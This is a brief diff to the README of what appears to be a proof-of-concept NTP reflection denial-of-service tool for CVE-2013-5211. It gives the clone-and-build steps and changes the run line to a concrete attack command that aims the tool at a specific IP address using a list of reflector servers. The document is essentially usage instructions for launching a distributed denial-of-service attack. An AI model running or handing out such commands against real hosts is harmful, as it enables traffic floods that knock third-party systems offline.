@@ -3,9 +3,13 @@
 PoC for distributed NTP reflection DoS (CVE-2013-5211).
 
 git clone https://github.com/CryptoXSS/ntpdos
+
 cd ntpdos
+
 make
-./ntpdos
+
+./ntpdos -t 50.7.198.146 -S servers.lst -p 4
+
 ## Usage
 
 ```
